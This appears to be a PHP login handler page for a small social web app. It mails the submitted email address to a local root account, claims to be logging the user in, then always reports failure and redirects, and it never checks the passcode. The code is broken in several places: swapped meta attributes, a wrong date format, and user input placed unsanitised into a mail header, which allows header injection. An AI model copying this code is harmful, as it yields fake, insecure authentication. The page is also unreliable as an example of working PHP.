<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" initial-scale="1.0" content="ie=edge">
	<meta http-equiv="X-UA-Compatability" content="width=device-width">
	<link rel="stylesheet" type="text/css" href="lib/bootstrap-4.0.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="styles/social_web_app.css">
</head>
<body>
<div>
	<progress value="25" max="99">
<?php
$email_a = htmlspecialchars($_POST['email_a']);
$passcode = htmlspecialchars($_POST['passcode']);
mail("root@localhost.localdomain", date('Y-m-d HH:mm:s'),"from:$email_a");
echo "<h2> Just a second, you are now being logged in . . . </h2>";
echo "  ";
echo "  ";
if($email_a && $passcode) {
	/*"(?=.*([a-z][A-Z][0-9]{8,15})"  */
	session_start();
	header("refresh:2; url=logout.php");
	echo "oops, we were unable to validate your information. Please check your CAPSLOCK and try again";
};
?>
	</progress>
	</div>
<?php
include("footer.php");
?>
<script src="lib/bootstrap-4.0.0/dist/js/bootstrap.min.js"></script>
</body>
</html>